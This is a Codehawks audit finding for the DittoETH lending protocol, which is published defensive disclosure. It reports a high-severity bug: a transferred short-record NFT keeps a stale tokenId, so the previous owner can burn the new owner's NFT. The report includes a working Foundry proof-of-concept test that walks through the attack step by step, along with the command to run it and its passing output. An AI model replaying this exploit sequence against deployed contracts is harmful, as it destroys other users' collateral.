---
tags:
  - lang/solidity
  - sector/lending
  - sector/nft
  - sector/nft-lending
  - platform/codehawks
  - has/github
  - severity/high
  - impact/loss-of-funds/direct-drain
protocol: "[[DittoETH]]"
auditors:
  - "[[hash]]"
genome:
  - "[[missing-modifier]]"
  - "[[direct-drain]]"
  - "[[access-roles]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# Previous NFT owner can burn NFT from the new owner

- id: 27455
- impact: HIGH
- protocol: [[DittoETH]]
- reporter: hash (Codehawks)
- source: N/A

## Summary


This bug report is about a vulnerability in the Short Records library of the 2023-09-ditto Ethereum smart contract. This vulnerability allows the previous NFT owner to burn the NFT from the new owner, leading to the loss of funds associated with the short record.

The vulnerability occurs when transferring a short record as an NFT. Internally, the short record is deleted from the sender and re-created for the new owner (receiver). However, the `tokenId` of the deleted short record is not reset, allowing the previous NFT owner to burn the NFT from the new owner.

This oversight leads to three issues:
1. The `ERC721Facet.balanceOf` function will report an incorrect NFT token balance for the previous NFT owner.
2. The previous NFT owner can not tokenize the remaining short record.
3. The previous NFT owner can burn the NFT from the new owner.

A test case has been provided to demonstrate the third issue.

The impact of this vulnerability is that the short record is rendered unusable and the funds associated with the short record are lost.

The recommendation is to reset the `tokenId` of the deleted short record in the `LibShortRecord.deleteShortRecord` function.

## Details

### Relevant GitHub Links
<a data-meta="codehawks-github-link" href="https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132">https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132</a>


## Summary

Short records can be transferred as NFTs. Internally, the short record is deleted from the sender and re-created for the new owner (receiver). However, the `tokenId` of the deleted short record is not reset, allowing the previous NFT owner to burn the NFT from the new owner.

## Vulnerability Details

Short positions, i.e., short records, can be represented as an NFT (ERC-721) with a specific `tokenId`, storing the reference to the short record id in the `shortRecordId` property of the `nftMapping` mapping.

Such a short record can be transferred to another address by sending the NFT to the new owner. Internally, when transferring the ERC-721 token, the `transferShortRecord` function is called (e.g., [in line 162](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L162) of the `ERC721Facet.transferFrom` function).

The `transferShortRecord` function first validates if the short record is transferable (e.g., not flagged and not canceled) and then calls the `deleteShortRecord` function in line 132 to delete the short record from the `shortRecords` mapping. Thereafter, a new short record with the values of the transferred short record is created with the new owner as the shorter, and the `nftMapping` struct is updated accordingly.

[contracts/libraries/LibShortRecord.sol#L132](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L132)

```solidity
120: function transferShortRecord(
121:     address asset,
122:     address from,
123:     address to,
124:     uint40 tokenId,
125:     STypes.NFT memory nft
126: ) internal {
127:     AppStorage storage s = appStorage();
128:     STypes.ShortRecord storage short = s.shortRecords[asset][from][nft.shortRecordId];
129:     if (short.status == SR.Cancelled) revert Errors.OriginalShortRecordCancelled();
130:     if (short.flaggerId != 0) revert Errors.CannotTransferFlaggedShort();
131:
132: ❌  deleteShortRecord(asset, from, nft.shortRecordId);
133:
134:     uint8 id = createShortRecord(
135:         asset,
136:         to,
137:         SR.FullyFilled,
138:         short.collateral,
139:         short.ercDebt,
140:         short.ercDebtRate,
141:         short.zethYieldRate,
142:         tokenId
143:     );
144:
145:     if (id == Constants.SHORT_MAX_ID) {
146:         revert Errors.ReceiverExceededShortRecordLimit();
147:     }
148:
149:     s.nftMapping[tokenId].owner = to;
150:     s.nftMapping[tokenId].shortRecordId = id;
151: }
```

However, the [`LibShortRecord.deleteShortRecord`](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/libraries/LibShortRecord.sol#L184-L225) function neglects to reset and delete the short record's `tokenId`, which is [initially set to the `tokenId` of the newly minted NFT in line of the `ERC721Facet.mintNFT` function](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L280). Consequently, upon transferring the short record, the deleted short record still references the transferred NFT's `tokenId`, in addition to the new short record which also references the same `tokenId`. Thus, two short records (with different owners), one being even deleted, reference the same NFT token.

This oversight leads to the following issues (with number 3 being the most severe):

1. **The `ERC721Facet.balanceOf` function will report an incorrect NFT token balance for the previous NFT owner:** If the short record was only partially filled before transferring it as a NFT, the [remaining short record can still be fully filled](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/BidOrdersFacet.sol#L284-L294), resetting the `SR.Cancelled` status. This will cause the `balanceOf` function to include this short record, and due to the short record still referencing the transferred NFT's `tokenId`, this NFT is still counted as owned by the previous owner.
2. **The previous NFT owner can not tokenize the remaining short record:** As the `tokenId` of the deleted short record is not reset, the previous owner can not tokenize the remaining short record as any attempt to mint a new NFT via the[ `ERC721Facet.mintNFT` function will revert with the `Errors.AlreadyMinted` error](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ERC721Facet.sol#L272).
3. **The previous NFT owner can burn the NFT from the new owner:** As the `tokenId` of the deleted and partially filled short record is not reset, the short can be fully filled, resetting the `SR.Cancelled` status. By subsequently combining this short with another short using the `ShortRecordFacet.combineShorts` function, the [combined shorts will have their associated NFT burned](https://github.com/Cyfrin/2023-09-ditto/blob/a93b4276420a092913f43169a353a6198d3c21b9/contracts/facets/ShortRecordFacet.sol#L168).

   _Please note that the owner of the transferred short record can re-mint a NFT for the short via the `ERC721Facet.mintNFT`, but if the owner is a contract, the contract may lack the required functionality to do so._

The following test case demonstrates the outline issue 3 above:

<details>
  <summary><strong>Test case (click to reveal)</strong></summary>

```solidity
function test_ExploitNFT() public {
    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);
    fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT * 2, sender);

    assertEq(diamond.getShortRecords(asset, sender).length, 1);

    vm.startPrank(sender);

    assertEq(getShorts()[0].id, 101);
    assertEq(getShorts()[0].shortRecordId, 2);
    assertEq(getShorts()[0].price, DEFAULT_PRICE);
    assertEq(getShorts()[0].ercAmount, DEFAULT_AMOUNT); // partially filled, 3 times DEFAULT_AMOUNT remaining

    assertEq(diamond.balanceOf(sender), 0);
    assertEq(diamond.getTokenId(), 1);

    diamond.mintNFT(asset, Constants.SHORT_STARTING_ID);
    diamond.setApprovalForAll(address(this), true);

    assertEq(diamond.balanceOf(sender), 1);
    assertEq(diamond.ownerOf(1), sender);

    diamond.safeTransferFrom(sender, address(0xBEEF), 1, "");

    assertEq(diamond.balanceOf(sender), 0); // NFT transferred, sender's balance is 0

    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);

    assertEq(diamond.balanceOf(sender), 1); // @audit-note balance is incorrectly 1 again

    assertEq(diamond.getApproved(1), address(0));
    assertEq(diamond.ownerOf(1), address(0xBEEF));
    assertEq(diamond.balanceOf(address(0xBEEF)), 1);

    fundLimitShortOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, sender); // new second short order
    assertEq(getShorts()[0].ercAmount, DEFAULT_AMOUNT);

    fundLimitBidOpt(DEFAULT_PRICE, DEFAULT_AMOUNT, receiver);

    assertEq(diamond.getShortRecordCount(asset, sender), 2); // Two existing shorts
    assertEq(diamond.getShortRecords(asset, sender)[0].id, Constants.SHORT_STARTING_ID + 1);
    assertTrue(diamond.getShortRecords(asset, sender)[0].status == SR.FullyFilled);
    assertEq(diamond.getShortRecords(asset, sender)[1].id, Constants.SHORT_STARTING_ID);
    assertTrue(diamond.getShortRecords(asset, sender)[1].status == SR.FullyFilled);

    assertEq(diamond.getAssetUserStruct(asset, sender).shortRecordId, 4);

    vm.startPrank(sender);
    diamond.mintNFT(asset, Constants.SHORT_STARTING_ID + 1);
    assertEq(diamond.balanceOf(sender), 2);

    combineShorts({
        id1: Constants.SHORT_STARTING_ID + 1,
        id2: Constants.SHORT_STARTING_ID
    });

    assertEq(diamond.balanceOf(address(0xBEEF)), 0); // @audit-note 0xBEEF got its NFT burned!
}
```

**How to run this test case:**

Copy-paste the above Solidity test into the `test/ERC721Facet.t.sol` file (e.g., in line 500) and run with

```bash
forge test --match-test "test_ExploitNFT"
```

**Result:**

```bash
Running 1 test for test/ERC721Facet.t.sol:ERC721Test
[PASS] test_ExploitNFT() (gas: 1884650)
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 55.71ms
```

</details>

## Impact

The previous NFT owner can burn the NFT from the new owner.

If this NFT transfer was part of a trade and, for instance, sent to an escrow contract, the previous NFT owner can burn the NFT from the escrow contract, while the escrow contract lacks the functionality to re-mint the NFT for the short record. This renders the short record unusable, and funds (collateral) associated with the short record are lost.

## Tools Used

Manual Review

## Recommendations

Consider resetting the `tokenId` of the deleted short record in the `LibShortRecord.deleteShortRecord` function.
